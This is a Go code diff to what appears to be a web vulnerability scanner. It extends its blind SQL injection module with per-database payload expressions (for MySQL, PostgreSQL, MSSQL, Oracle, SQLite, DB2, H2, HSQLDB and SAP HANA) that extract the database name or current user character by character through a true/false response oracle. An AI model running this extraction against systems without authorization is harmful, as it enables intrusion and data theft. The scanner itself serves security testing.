@@ -34,7 +34,7 @@ import (
 // code of its n-th character. Only widely-portable primitives are used; recipes
 // are tried in order and the first whose oracle calibrates and extracts wins.
 type dbNameExpr struct {
-	dbms   string
+	dbms   string // optional "/current-user" suffix identifies fallback proof
 	name   string // expression that yields the current database name
 	length string // Sprintf(length, name) → its character length
 	nth    string // Sprintf(nth, name, pos) → ASCII/UNICODE code of the pos-th char
@@ -47,12 +47,44 @@ var dbNameExprs = []dbNameExpr{
 		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s) FROM %d FOR 1))"},
 	{dbms: "mssql", name: "DB_NAME()",
 		length: "LEN(%s)", nth: "UNICODE(SUBSTRING((%s),%d,1))"},
-	{dbms: "oracle", name: "SYS.DATABASE_NAME",
+	{dbms: "oracle", name: "SYS_CONTEXT('USERENV','DB_NAME')",
 		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
+	// SQLite has no per-file current_database() primitive. Its runtime version is
+	// still database-computed, stable, extractable proof that arbitrary SQLite
+	// expressions execute through the oracle.
+	{dbms: "sqlite", name: "sqlite_version()",
+		length: "LENGTH(%s)", nth: "UNICODE(SUBSTR((%s),%d,1))"},
+	{dbms: "db2", name: "CURRENT SERVER",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
+	{dbms: "h2", name: "DATABASE()",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	{dbms: "hsqldb", name: "DATABASE()",
+		length: "CHAR_LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	{dbms: "sap-hana", name: "CURRENT_SCHEMA",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	// If schema/database name access is restricted or empty, a current-user value
+	// is an equally DB-computed, report-safe proof. It demonstrates arbitrary SQL
+	// expression evaluation without dumping application data.
+	{dbms: "mysql/current-user", name: "CURRENT_USER()",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	{dbms: "postgresql/current-user", name: "CURRENT_USER",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s) FROM %d FOR 1))"},
+	{dbms: "mssql/current-user", name: "SUSER_SNAME()",
+		length: "LEN(%s)", nth: "UNICODE(SUBSTRING((%s),%d,1))"},
+	{dbms: "oracle/current-user", name: "SYS_CONTEXT('USERENV','CURRENT_USER')",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
+	{dbms: "db2/current-user", name: "CURRENT USER",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTR((%s),%d,1))"},
+	{dbms: "h2/current-user", name: "USER()",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	{dbms: "hsqldb/current-user", name: "CURRENT_USER",
+		length: "CHAR_LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
+	{dbms: "sap-hana/current-user", name: "CURRENT_USER",
+		length: "LENGTH(%s)", nth: "ASCII(SUBSTRING((%s),%d,1))"},
 }
 
 const (
-	dbNameMaxLen  = 40 // sane cap; real DB names are short
+	dbNameMaxLen  = 96 // PostgreSQL identifiers reach 63; user@host can be longer
 	dbNameMinCode = 32
 	dbNameMaxCode = 126
 )
@@ -67,6 +99,19 @@ func (s *SQLiScanner) blindExtractDBName(
 	ctx context.Context, ip insertionPoint, auth map[string]string,
 	condFmt string, isTrueLike func([]byte) bool,
 ) (string, string, bool) {
+	return s.blindExtractDBNameResponse(ctx, ip, auth, condFmt, func(r injectedResponse) bool {
+		return isTrueLike([]byte(r.Body))
+	})
+}
+
+// blindExtractDBNameResponse is the status-aware extraction core. Some SQL
+// oracles express FALSE as 404/403/500 while rendering an equal-length body;
+// preserving the HTTP status prevents those real blind injections from being
+// discarded. The compatibility wrapper above retains body-only callers/tests.
+func (s *SQLiScanner) blindExtractDBNameResponse(
+	ctx context.Context, ip insertionPoint, auth map[string]string,
+	condFmt string, isTrueLike func(injectedResponse) bool,
+) (string, string, bool) {
 
 	// ask evaluates ONE boolean SQL condition: it sends the condition AND its
 	// negation and requires them to read oppositely (reproduced once). Two-sided +
@@ -78,18 +123,18 @@ func (s *SQLiScanner) blindExtractDBName(
 		}
 		pos := fmt.Sprintf(condFmt, cond)
 		neg := fmt.Sprintf(condFmt, "NOT ("+cond+")")
-		p1, _ := sendInjected(ctx, sqliHTTPClient, ip, pos, auth)
-		n1, _ := sendInjected(ctx, sqliHTTPClient, ip, neg, auth)
-		if len(p1) == 0 || len(n1) == 0 {
+		p1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pos, auth)
+		n1 := sendInjectedResponse(ctx, sqliHTTPClient, ip, neg, auth)
+		if p1.Status == 0 || n1.Status == 0 {
 			return false, false
 		}
-		tp, tn := isTrueLike([]byte(p1)), isTrueLike([]byte(n1))
+		tp, tn := isTrueLike(p1), isTrueLike(n1)
 		if tp == tn {
 			return false, false // oracle didn't separate the two sides → unusable
 		}
 		// reproduce the POSITIVE side once to reject a page that just wobbles.
-		p2, _ := sendInjected(ctx, sqliHTTPClient, ip, pos, auth)
-		if len(p2) == 0 || isTrueLike([]byte(p2)) != tp {
+		p2 := sendInjectedResponse(ctx, sqliHTTPClient, ip, pos, auth)
+		if p2.Status == 0 || isTrueLike(p2) != tp {
 			return false, false
 		}
 		return tp, true
@@ -194,4 +239,14 @@ func plausibleDBName(s string) bool {
 		}
 	}
 	return false
+}
+
+func blindSQLProofDescription(value, dbms string) string {
+	if strings.HasSuffix(dbms, "/current-user") {
+		return fmt.Sprintf("current database user = %q (%s)", value, strings.TrimSuffix(dbms, "/current-user"))
+	}
+	if dbms == "sqlite" {
+		return fmt.Sprintf("SQLite runtime version = %q", value)
+	}
+	return fmt.Sprintf("current database/schema = %q (%s)", value, dbms)
 }
